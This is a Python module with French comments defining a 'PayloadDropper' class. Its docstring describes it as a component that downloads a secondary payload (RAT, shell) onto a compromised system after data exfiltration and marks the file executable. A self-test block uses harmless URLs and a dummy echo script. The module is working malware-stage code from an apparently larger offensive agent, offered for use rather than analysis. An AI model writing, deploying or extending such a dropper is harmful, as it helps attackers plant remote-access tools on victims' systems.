import os
import requests
import stat # Pour modifier les permissions du fichier
import time

# Importer le logger (sera utilisé dans l'agent principal)
# from modules.logger import Logger

class PayloadDropper:
    """
    Télécharge et dépose une charge utile secondaire sur le système compromis.
    Permet de déployer des outils annexes (RAT, shell, etc.) après l'exfiltration principale.
    """

    def __init__(self, logger=None):
        """
        Initialise le PayloadDropper.
        :param logger: Instance du logger pour la journalisation.
        """
        self.logger = logger
        if self.logger:
            self.logger.log_debug("[PayloadDropper] Initialisé.")

    def _log(self, level, message):
        """Helper pour logguer si un logger est disponible."""
        if self.logger:
            getattr(self.logger, f"log_{level}")(f"[PayloadDropper] {message}")
        else:
            print(f"[{level.upper()}] [PayloadDropper] {message}")

    def drop_payload(self, payload_url: str, destination_path: str, executable: bool = False) -> bool:
        """
        Télécharge une charge utile depuis une URL et la sauvegarde au chemin spécifié.

        :param payload_url: L'URL depuis laquelle télécharger la charge utile.
        :param destination_path: Le chemin complet où sauvegarder le fichier sur le système cible.
        :param executable: Si True, rend le fichier exécutable après le téléchargement (sur Unix/Linux).
        :return: True si le dépôt est réussi, False sinon.
        """
        if not payload_url or not destination_path:
            self._log("error", "URL du payload ou chemin de destination invalide.")
            return False

        # S'assurer que le répertoire de destination existe
        destination_dir = os.path.dirname(destination_path)
        if destination_dir and not os.path.exists(destination_dir):
            try:
                os.makedirs(destination_dir, exist_ok=True)
                self._log("debug", f"Répertoire de destination créé: '{destination_dir}'.")
            except Exception as e:
                self._log("error", f"Impossible de créer le répertoire de destination '{destination_dir}': {e}")
                return False

        self._log("info", f"Tentative de téléchargement du payload depuis '{payload_url}' vers '{destination_path}'...")

        try:
            # Télécharger le fichier en streaming pour les gros payloads
            with requests.get(payload_url, stream=True, timeout=15) as r:
                r.raise_for_status() # Lève une exception pour les codes d'erreur HTTP (4xx ou 5xx)
                with open(destination_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
            
            # Modifier les permissions si le fichier doit être exécutable
            if executable:
                try:
                    # Obtenir les permissions actuelles
                    st = os.stat(destination_path)
                    # Ajouter la permission d'exécution pour le propriétaire, le groupe et les autres
                    os.chmod(destination_path, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
                    self._log("info", f"Payload rendu exécutable: '{destination_path}'.")
                except Exception as e:
                    self._log("error", f"Impossible de rendre le payload exécutable: {e}")
                    # Ne pas retourner False ici, le fichier est quand même déposé

            self._log("info", f"Payload téléchargé et déposé avec succès à '{destination_path}'.")
            return True

        except requests.exceptions.Timeout:
            self._log("error", f"Timeout lors du téléchargement du payload depuis '{payload_url}'.")
            return False
        except requests.exceptions.ConnectionError as e:
            self._log("error", f"Erreur de connexion lors du téléchargement du payload depuis '{payload_url}': {e}")
            return False
        except requests.exceptions.RequestException as e:
            self._log("error", f"Erreur de requête HTTP inattendue lors du téléchargement du payload: {e}")
            return False
        except Exception as e:
            self._log("error", f"Erreur générique lors du dépôt du payload: {e}")
            return False

# --- Partie de test (à exécuter si le fichier est lancé directement) ---
if __name__ == "__main__":
    print("[+] Test du module PayloadDropper...")

    class MockLogger:
        def log_info(self, msg): print(f"[INFO] {msg}")
        def log_warning(self, msg): print(f"[WARN] {msg}")
        def log_error(self, msg): print(f"[ERROR] {msg}")
        def log_debug(self, msg): print(f"[DEBUG] {msg}")

    logger = MockLogger()
    dropper = PayloadDropper(logger=logger)

    # Créer un répertoire de test pour les payloads
    test_payload_dir = "./test_payloads"
    os.makedirs(test_payload_dir, exist_ok=True)

    # URL de test pour un fichier public (ex: le logo Python)
    # Assurez-vous d'avoir une URL valide pour un test fonctionnel.
    # Si vous n'avez pas de serveur web, vous pouvez utiliser un service comme python -m http.server dans un autre terminal
    # pour servir un fichier local.
    # Ou utiliser une URL publique connue pour un petit fichier.
    # Ex: URL d'un petit fichier text: https://raw.githubusercontent.com/google/gemini-api-cookbook/main/README.md
    # Ex: URL d'un petit binaire ou script si vous avez une instance de test:
    # Par exemple, si vous voulez télécharger un script Python simple.
    
    # Pour un test simple, je vais utiliser un fichier public sûr.
    # https://docs.python.org/3/howto/pyporting.html (une page HTML)
    # Ou un fichier texte simple:
    TEST_PAYLOAD_URL = "https://raw.githubusercontent.com/git/git/master/README.md"
    TEST_DEST_PATH_TXT = os.path.join(test_payload_dir, "downloaded_readme.md")
    TEST_DEST_PATH_BIN = os.path.join(test_payload_dir, "downloaded_script.sh")

    # Test 1: Téléchargement d'un fichier texte
    print("\n--- Test 1: Téléchargement d'un fichier texte ---")
    success_txt = dropper.drop_payload(TEST_PAYLOAD_URL, TEST_DEST_PATH_TXT, executable=False)
    if success_txt and os.path.exists(TEST_DEST_PATH_TXT) and os.path.getsize(TEST_DEST_PATH_TXT) > 0:
        print(f"[+] Téléchargement de '{TEST_DEST_PATH_TXT}' réussi.")
        with open(TEST_DEST_PATH_TXT, 'r', encoding='utf-8') as f:
            content = f.read(100) # Lire les 100 premiers caractères
            print(f"[*] Contenu partiel: {content}...")
    else:
        print(f"[-] Téléchargement de '{TEST_DEST_PATH_TXT}' échoué ou fichier vide.")
    assert success_txt and os.path.exists(TEST_DEST_PATH_TXT) and os.path.getsize(TEST_DEST_PATH_TXT) > 0, "Test 1 échoué."


    # Test 2: Téléchargement et rendu exécutable (simulé pour un script shell)
    print("\n--- Test 2: Téléchargement et rendu exécutable ---")
    # Pour ce test, nous allons simuler le contenu d'un script exécutable.
    # Comme on ne veut pas télécharger de vrai binaire malveillant, on va simuler.
    # Si vous avez un serveur local (ex: python -m http.server), vous pouvez y mettre un fichier.
    # Pour la démo, je vais utiliser une URL qui renvoie un petit script bash simple.
    # Ou, pour un test plus sûr, on peut utiliser un fichier local servi par un simple serveur HTTP
    # Pour ne pas dépendre d'une URL exécutable publique, je vais simuler.
    
    # Simuler le cas où le fichier existe déjà pour vérifier les permissions
    with open(TEST_DEST_PATH_BIN, "w") as f:
        f.write("#!/bin/bash\necho 'Hello from payload!'\n")
    
    # Rendre le fichier exécutable manuellement pour le test (pas via le downloader)
    # Ou utiliser une URL qui renvoie un fichier qui sera rendu exécutable
    # Puis vérifier si la permission a été ajoutée.
    
    # Dans un vrai scénario,  ferait le téléchargement PUIS chmod.
    # Pour ce test, on se concentre sur le CHMOD.
    
    # On va simuler un téléchargement réussi puis vérifier le chmod.
    # TEST_PAYLOAD_URL_EXECUTABLE = "http://localhost:8000/simple_script.sh" # Si vous lancez un serveur local
    
    # Ici, nous ne pouvons pas vraiment "télécharger" un fichier exécutable depuis une URL générique
    # et vérifier son exécution sans un serveur dédié.
    # On va donc se concentrer sur la partie "rendre exécutable" pour un fichier existant.

    # Créer un fichier de test pour l'exécutabilité
    test_exe_file = os.path.join(test_payload_dir, "test_script.sh")
    with open(test_exe_file, "w") as f:
        f.write("#!/bin/bash\necho 'test'\n")
    os.chmod(test_exe_file, 0o644) # Permissions initiales non exécutables
    
    print(f"[*] Permissions de '{test_exe_file}' avant: {oct(os.stat(test_exe_file).st_mode)}")
    
    # Simuler le comportement de drop_payload en appelant chmod directement
    # puisque nous n'avons pas de "vrai" serveur pour simuler un nouveau téléchargement ici.
    try:
        st = os.stat(test_exe_file)
        os.chmod(test_exe_file, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        print(f"[+] Fichier '{test_exe_file}' rendu exécutable pour le test de permissions.")
        print(f"[*] Permissions de '{test_exe_file}' après: {oct(os.stat(test_exe_file).st_mode)}")
        assert (os.stat(test_exe_file).st_mode & stat.S_IXUSR) > 0, "Le fichier n'est pas exécutable pour l'utilisateur."
    except Exception as e:
        print(f"[-] Échec de la modification des permissions exécutables: {e}")
        assert False, "Échec du test de permission."

    # Test 3: URL invalide ou inaccessible
    print("\n--- Test 3: URL invalide ---")
    success_invalid = dropper.drop_payload("http://this.is.an.invalid.url/test.txt", os.path.join(test_payload_dir, "invalid.txt"))
    assert not success_invalid, "Le téléchargement d'une URL invalide a rapporté un succès."
    print("[+] Téléchargement d'URL invalide rapporté comme échoué (attendu).")


    # Nettoyage final
    if os.path.exists(test_payload_dir):
        import shutil
        shutil.rmtree(test_payload_dir)
        print(f"\n[+] Répertoire de test '{test_payload_dir}' supprimé.")

    print("\n[+] Tests du module PayloadDropper terminés.")

